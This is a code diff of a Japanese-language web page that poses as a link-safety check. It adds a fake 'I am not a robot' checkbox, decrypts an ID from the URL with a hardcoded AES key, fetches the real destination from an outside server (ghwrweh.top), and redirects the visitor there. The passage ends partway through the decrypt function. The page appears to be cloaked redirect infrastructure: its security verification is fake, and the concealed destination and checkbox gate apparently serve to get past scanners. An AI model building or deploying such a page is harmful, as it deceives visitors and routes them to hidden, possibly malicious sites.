@@ -8,46 +8,72 @@
   <style>
     body { text-align:center; font-family:sans-serif; padding-top:80px; background:#f9f9f9; }
     .loader { margin:30px auto; border:6px solid #f3f3f3; border-top:6px solid #3498db;
-             border-radius:50%; width:50px; height:50px; animation:spin 1s infinite; }
+              border-radius:50%; width:50px; height:50px; animation:spin 1s infinite; display: none; }
     @keyframes spin { to { transform: rotate(360deg); } }
     .caption { color:#666; font-size:13px; margin-top:10px; }
+    .verify-box { margin-top: 30px; }
+    .error { color: red; margin-top: 10px; }
+    label { cursor: pointer; }
   </style>
 </head>
 <body>
   <h2>セキュリティ確認中...</h2>
-  <p>リンクの安全性を確認しています。まもなくリダイレクトします。</p>
-  <div class="loader"></div>
+  <p>リンクの安全性を確認しています。下のボックスをチェックしてください。</p>
+
+  <div class="verify-box">
+    <input type="checkbox" id="verify">
+    <label for="verify">私はロボットではありません</label>
+  </div>
+
+  <div class="loader" id="loader"></div>
   <p class="caption">セキュア認証サービス</p>
+  <p class="error" id="errorMsg"></p>
 
   <script>
-    const AES_KEY = "5Ctianyoumabiiii"; // 必须与你后端一致（16 字节）
-    
+    const AES_KEY = "5Ctianyoumabiiii"; // 与后端一致
     const path = location.pathname.split("/").filter(Boolean);
     const encryptedId = path[path.length - 1];
 
-    if (!encryptedId) {
-      document.body.innerHTML += '<p style="color:red;">ID が見つかりません。</p>';
-    } else {
-      decryptAES(encryptedId).then(realId => {
-        if (realId) {
-          fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(realId))
-            .then(r => r.json())
-            .then(data => {
-              const final = data?.data?.siteUrl;
-              if (final) {
-                setTimeout(() => location.href = final, 3000);
-              } else {
-                document.body.innerHTML += '<p style="color:red;">リダイレクト先が見つかりません。</p>';
-              }
-            })
-            .catch(() => {
-              document.body.innerHTML += '<p style="color:red;">APIエラーが発生しました。</p>';
-            });
+    const checkbox = document.getElementById("verify");
+    const loader = document.getElementById("loader");
+    const errorMsg = document.getElementById("errorMsg");
+
+    checkbox.addEventListener("change", async () => {
+      if (!checkbox.checked) return;
+
+      loader.style.display = "block";
+      errorMsg.innerText = "";
+
+      if (!encryptedId) {
+        errorMsg.innerText = "ID が見つかりません。";
+        loader.style.display = "none";
+        return;
+      }
+
+      const realId = await decryptAES(encryptedId);
+      if (!realId) {
+        errorMsg.innerText = "ID復号に失敗しました。";
+        loader.style.display = "none";
+        return;
+      }
+
+      try {
+        const res = await fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(realId));
+        const json = await res.json();
+        const final = json?.data?.siteUrl;
+        if (!final) {
+          errorMsg.innerText = "リダイレクト先が見つかりません。";
+          loader.style.display = "none";
         } else {
-          document.body.innerHTML += '<p style="color:red;">ID復号に失敗しました。</p>';
+          setTimeout(() => {
+            location.href = final;
+          }, 1500);
         }
-      });
-    }
+      } catch {
+        errorMsg.innerText = "APIエラーが発生しました。";
+        loader.style.display = "none";
+      }
+    });
 
     async function decryptAES(encText) {
       try {
